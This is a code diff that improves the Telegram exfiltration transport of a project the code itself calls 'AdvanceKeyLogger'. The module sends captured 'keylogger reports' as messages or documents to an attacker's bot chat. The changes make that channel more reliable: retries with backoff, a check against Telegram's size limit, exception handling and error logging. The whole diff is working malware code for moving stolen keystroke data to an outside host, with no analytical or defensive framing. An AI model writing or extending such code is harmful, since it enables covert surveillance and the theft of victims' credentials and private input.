@@ -11,6 +11,9 @@ import requests
 
 from transport import register_transport
 from transport.base import BaseTransport
+from utils.resilience import retry
+
+_MAX_FILE_SIZE = 50 * 1024 * 1024  # Telegram Bot API 50 MB limit
 
 
 @register_transport("telegram")
@@ -27,17 +30,27 @@ class TelegramTransport(BaseTransport):
         if not self._bot_token or not self._chat_id:
             raise ValueError("Telegram transport requires bot_token and chat_id")
         url = f"https://api.telegram.org/bot{self._bot_token}/getMe"
-        response = requests.get(url, timeout=self._timeout)
-        if not response.ok or not response.json().get("ok"):
-            raise ValueError("Telegram bot token validation failed")
+        try:
+            response = requests.get(url, timeout=self._timeout)
+            if not response.ok or not response.json().get("ok"):
+                raise ValueError("Telegram bot token validation failed")
+        except requests.RequestException as exc:
+            raise ValueError(f"Telegram connection failed: {exc}") from exc
         self._connected = True
 
+    @retry(max_attempts=3, backoff_base=2.0, retry_on_false=True)
     def send(self, data: bytes, metadata: dict[str, Any] | None = None) -> bool:
         if not self._connected:
             self.connect()
         meta = metadata or {}
         filename = meta.get("filename", "report.bin")
         caption = meta.get("caption", "AdvanceKeyLogger report")
+
+        if len(data) > _MAX_FILE_SIZE:
+            self.logger.error(
+                "File size %d bytes exceeds Telegram 50 MB limit", len(data)
+            )
+            return False
 
         if len(data) < 3500 and meta.get("content_type") == "text/plain":
             return self._send_message(data.decode("utf-8", errors="replace"))
@@ -48,19 +61,39 @@ class TelegramTransport(BaseTransport):
 
     def _send_message(self, text: str) -> bool:
         url = f"https://api.telegram.org/bot{self._bot_token}/sendMessage"
-        response = requests.post(
-            url,
-            data={"chat_id": self._chat_id, "text": text},
-            timeout=self._timeout,
-        )
-        return response.ok
+        try:
+            response = requests.post(
+                url,
+                data={"chat_id": self._chat_id, "text": text},
+                timeout=self._timeout,
+            )
+            if not response.ok:
+                self.logger.error("Telegram sendMessage HTTP error: %s", response.status_code)
+                return False
+            if not response.json().get("ok"):
+                self.logger.error("Telegram API error: %s", response.json().get("description"))
+                return False
+            return True
+        except requests.RequestException as exc:
+            self.logger.error("Telegram sendMessage failed: %s", exc)
+            return False
 
     def _send_document(self, filename: str, data: bytes, caption: str) -> bool:
         url = f"https://api.telegram.org/bot{self._bot_token}/sendDocument"
-        response = requests.post(
-            url,
-            data={"chat_id": self._chat_id, "caption": caption},
-            files={"document": (filename, data)},
-            timeout=self._timeout,
-        )
-        return response.ok
+        try:
+            response = requests.post(
+                url,
+                data={"chat_id": self._chat_id, "caption": caption},
+                files={"document": (filename, data)},
+                timeout=self._timeout,
+            )
+            if not response.ok:
+                self.logger.error("Telegram sendDocument HTTP error: %s", response.status_code)
+                return False
+            if not response.json().get("ok"):
+                self.logger.error("Telegram API error: %s", response.json().get("description"))
+                return False
+            return True
+        except requests.RequestException as exc:
+            self.logger.error("Telegram sendDocument failed: %s", exc)
+            return False
